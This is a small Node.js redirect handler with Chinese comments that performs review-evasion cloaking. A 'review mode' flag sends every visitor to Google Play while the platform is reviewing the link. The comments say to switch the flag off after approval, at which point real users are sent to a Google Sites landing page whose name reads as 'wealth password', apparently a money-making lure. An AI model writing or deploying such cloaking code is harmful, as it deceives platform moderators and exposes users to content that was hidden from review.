// api/redirect.js
module.exports = (req, res) => {
    // 审核模式：过审前设为 true，过审后改为 false
    const IS_REVIEW_MODE = true;
    
    const REVIEW_PAGE = 'https://play.google.com';
    const MY_LANDING_PAGE = 'https://sites.google.com/view/caifumima-bitepiae/%E9%A6%96%E9%A1%B5?authuser=2';

    // 审核模式：所有请求跳转到 google.com
    if (IS_REVIEW_MODE) {
        return res.redirect(302, REVIEW_PAGE);
    }

    // 真实用户跳转到落地页
    return res.redirect(302, MY_LANDING_PAGE);
};
